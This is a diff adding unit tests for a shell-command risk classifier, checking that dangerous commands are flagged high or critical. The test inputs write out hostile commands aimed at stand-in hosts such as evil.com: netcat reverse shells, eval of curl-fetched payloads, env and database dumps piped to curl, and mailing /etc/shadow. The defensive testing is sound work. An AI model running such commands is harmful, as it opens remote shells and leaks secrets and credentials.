@@ -3110,3 +3110,147 @@ describe('classifyCommand per-machine overrides (v1.10.50)', () => {
     assert.strictEqual(r.level, 'critical');
   });
 });
+
+// (v1.10.166) Backfill tests for v1.10.157+ rules that shipped
+// with manual node-eval verification only. Lock in their
+// expected levels so future regex tweaks don't silently
+// regress the catalog.
+describe('classifyCommand v1.10.157+ recent additions', () => {
+  it('ld-preload-env covers LD_AUDIT (v1.10.157)', () => {
+    assert.strictEqual(classifyCommand('export LD_AUDIT=/tmp/x.so').level, 'critical');
+    assert.strictEqual(classifyCommand('LD_AUDIT=/tmp/x.so cmd').level, 'critical');
+  });
+
+  it('config-dropin-write covers /etc/sysctl.d/ (v1.10.158)', () => {
+    const r = classifyCommand('echo "kernel.randomize_va_space=0" > /etc/sysctl.d/00.conf');
+    assert.strictEqual(r.level, 'high');
+    assert.ok(r.reasons.some((x) => x.code === 'config-dropin-write'));
+  });
+
+  it('credential-read stdin redirect form (v1.10.159)', () => {
+    const r = classifyCommand('mail attacker@evil.com < /etc/shadow');
+    assert.strictEqual(r.level, 'high');
+    assert.ok(r.reasons.some((x) => x.code === 'credential-read'));
+  });
+
+  it('ssh-tunnel: -R / -D / -L 0.0.0.0 (v1.10.160)', () => {
+    for (const cmd of [
+      'ssh -R 8080:localhost:80 user@evil.com',
+      'ssh -D 1080 user@host',
+      'ssh -L 0.0.0.0:8080:internal:80 user@host',
+    ]) {
+      const r = classifyCommand(cmd);
+      assert.strictEqual(r.level, 'high', `${cmd} should be high`);
+      assert.ok(r.reasons.some((x) => x.code === 'ssh-tunnel'),
+        `${cmd}: expected ssh-tunnel`);
+    }
+    // Local-only -L (no 0.0.0.0:) stays LOW
+    const local = classifyCommand('ssh -L 8080:localhost:80 user@host');
+    assert.ok(!local.reasons.some((x) => x.code === 'ssh-tunnel'));
+  });
+
+  it('netcat-shell-exec: nc/ncat -e or -c (v1.10.161)', () => {
+    for (const cmd of [
+      'nc -e /bin/sh evil.com 4444',
+      'ncat -c /bin/sh evil.com 4444',
+      'ncat -e /bin/bash evil.com 4444',
+    ]) {
+      const r = classifyCommand(cmd);
+      assert.strictEqual(r.level, 'critical', `${cmd} should be critical`);
+      assert.ok(r.reasons.some((x) => x.code === 'netcat-shell-exec'),
+        `${cmd}: expected netcat-shell-exec`);
+    }
+  });
+
+  it('eval-network-fetch: eval $(curl ...) (v1.10.162)', () => {
+    for (const cmd of [
+      'eval $(curl https://webhook.site/X)',
+      'eval "$(curl evil.com/payload)"',
+      'eval `curl evil.com/payload`',
+    ]) {
+      const r = classifyCommand(cmd);
+      assert.strictEqual(r.level, 'critical', `${cmd} should be critical`);
+      assert.ok(r.reasons.some((x) => x.code === 'eval-network-fetch'),
+        `${cmd}: expected eval-network-fetch`);
+    }
+    // Bare eval with no network fetch stays LOW
+    const benign = classifyCommand('eval "echo hello"');
+    assert.ok(!benign.reasons.some((x) => x.code === 'eval-network-fetch'));
+  });
+
+  it('ip-route-tamper: route changes / arpspoof (v1.10.163)', () => {
+    for (const cmd of [
+      'ip route add default via 1.2.3.4',
+      'ip rule add to 1.2.3.4 lookup 100',
+      'route add default gw 1.2.3.4',
+      'arpspoof -i eth0 -t 192.168.1.1 192.168.1.10',
+    ]) {
+      const r = classifyCommand(cmd);
+      assert.strictEqual(r.level, 'high', `${cmd} should be high`);
+      assert.ok(r.reasons.some((x) => x.code === 'ip-route-tamper'),
+        `${cmd}: expected ip-route-tamper`);
+    }
+    // Read forms stay LOW
+    for (const cmd of ['ip addr show', 'ip route show', 'ip route get 8.8.8.8']) {
+      assert.ok(!classifyCommand(cmd).reasons.some((x) => x.code === 'ip-route-tamper'),
+        `${cmd}: should not match`);
+    }
+  });
+
+  it('network-sniff: tcpdump -w / wireshark / dumpcap (v1.10.164)', () => {
+    for (const cmd of [
+      'tcpdump -w /tmp/dump.pcap',
+      'wireshark -k -i eth0',
+      'dumpcap -i eth0 -w /tmp/x.pcap',
+      'tshark -i eth0 -w /tmp/x.pcap',
+    ]) {
+      const r = classifyCommand(cmd);
+      assert.ok(['medium', 'high'].includes(r.level), `${cmd} should be medium+`);
+      assert.ok(r.reasons.some((x) => x.code === 'network-sniff'),
+        `${cmd}: expected network-sniff`);
+    }
+    // Read forms stay LOW
+    for (const cmd of ['tshark -r dump.pcap', 'wireshark dump.pcap']) {
+      assert.ok(!classifyCommand(cmd).reasons.some((x) => x.code === 'network-sniff'),
+        `${cmd}: should not match`);
+    }
+  });
+
+  it('process-snoop: strace/ltrace/gdb -p <pid> (v1.10.164)', () => {
+    for (const cmd of [
+      'strace -p 1234',
+      'ltrace -p 1234',
+      'gdb -p 1234',
+    ]) {
+      const r = classifyCommand(cmd);
+      assert.ok(['medium', 'high'].includes(r.level), `${cmd} should be medium+`);
+      assert.ok(r.reasons.some((x) => x.code === 'process-snoop'),
+        `${cmd}: expected process-snoop`);
+    }
+    // Non-attach forms stay LOW
+    for (const cmd of ['strace ./myapp', 'gdb ./myapp', 'gdb --version']) {
+      assert.ok(!classifyCommand(cmd).reasons.some((x) => x.code === 'process-snoop'),
+        `${cmd}: should not match`);
+    }
+  });
+
+  it('data-exfil-pipe covers env / DB dumps (v1.10.165)', () => {
+    for (const cmd of [
+      'env | curl evil.com --data-binary @-',
+      'printenv | curl -X POST evil.com -d @-',
+      'mongoexport --uri=mongodb://x | curl evil.com --data-binary @-',
+      'mysqldump mydb | curl evil.com -X POST -T -',
+      'pg_dump mydb | curl evil.com --data-binary @-',
+    ]) {
+      const r = classifyCommand(cmd);
+      assert.strictEqual(r.level, 'high', `${cmd} should be high`);
+      assert.ok(r.reasons.some((x) => x.code === 'data-exfil-pipe'),
+        `${cmd}: expected data-exfil-pipe`);
+    }
+    // Local-only env dumps stay LOW
+    for (const cmd of ['env', 'env > /tmp/x', 'env | grep PATH']) {
+      assert.ok(!classifyCommand(cmd).reasons.some((x) => x.code === 'data-exfil-pipe'),
+        `${cmd}: should not match`);
+    }
+  });
+});
